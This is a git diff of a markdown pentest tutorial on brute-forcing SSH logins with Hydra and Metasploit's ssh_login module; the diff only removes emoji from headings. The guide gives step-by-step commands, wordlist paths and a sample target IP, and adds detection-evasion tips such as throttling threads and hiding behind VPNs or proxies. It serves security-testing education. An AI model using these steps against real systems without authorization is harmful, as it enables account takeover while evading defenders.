@@ -1,13 +1,13 @@
 # Bruteforce Attacks Guide
 
-## 🔹 Introduction
+##  Introduction
 Bruteforce attacks involve systematically trying multiple usernames and passwords to gain access to a target system. This technique is useful for **testing password strength**, **identifying weak/default credentials**, and **evaluating blue team detection capabilities**.
 
-⚠️ **Warning:** Bruteforce attacks against SSH are **loud** and can be easily detected by defensive teams.
+**Warning:** Bruteforce attacks against SSH are **loud** and can be easily detected by defensive teams.
 
 ---
 
-## 🔹 Bruteforcing SSH with Hydra
+##  Bruteforcing SSH with Hydra
 Hydra is a **fast and flexible password brute-force tool** that supports multiple protocols, including SSH.
 
 ### **Basic SSH Bruteforce Attack**
@@ -32,15 +32,15 @@ hydra -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://1
 
 ---
 
-## 🔹 Bruteforcing SSH with Metasploit
+##  Bruteforcing SSH with Metasploit
 Metasploit has a built-in SSH brute-force module for automated attacks.
 
-### **1️⃣ Launch MSFConsole**
+### **1️ Launch MSFConsole**
 ```bash
 msfconsole
 ```
 
-### **2️⃣ Find the SSH Bruteforce Module**
+### **2️ Find the SSH Bruteforce Module**
 ```bash
 search ssh
 ```
@@ -49,12 +49,12 @@ Look for:
 auxiliary/scanner/ssh/ssh_login
 ```
 
-### **3️⃣ Load the SSH Login Module**
+### **3️ Load the SSH Login Module**
 ```bash
 use auxiliary/scanner/ssh/ssh_login
 ```
 
-### **4️⃣ Set Required Options**
+### **4️ Set Required Options**
 ```bash
 options
 set username root
@@ -65,7 +65,7 @@ set rhosts 192.168.57.137
 - **`set pass_file`** → Defines the password wordlist.
 - **`set rhosts`** → Specifies the target IP.
 
-### **5️⃣ Adjust Settings for Speed & Visibility**
+### **5️ Adjust Settings for Speed & Visibility**
 ```bash
 set threads 10
 ```
@@ -78,7 +78,7 @@ set verbose true
 ```
 - **Shows real-time progress** in the terminal.
 
-### **6️⃣ Run the Attack**
+### **6️ Run the Attack**
 ```bash
 run
 ```
@@ -86,7 +86,7 @@ Metasploit will start attempting logins. If successful, it will display **valid 
 
 ---
 
-## 🔹 Additional Considerations
+##  Additional Considerations
 ### **Detection & Evasion Tips:**
 - **Reduce threads (`-t 1` or `-t 2`)** to slow down attacks and avoid detection.
 - **Use VPNs or proxies** to mask your IP.
@@ -101,5 +101,5 @@ Metasploit will start attempting logins. If successful, it will display **valid 
 
 ---
 
-## 🔹 Conclusion
+##  Conclusion
 Bruteforce attacks are **noisy** and should only be used for **testing password security** in ethical hacking engagements. By leveraging **Hydra and Metasploit**, security professionals can assess the **strength of credentials** and identify **vulnerable SSH services**.
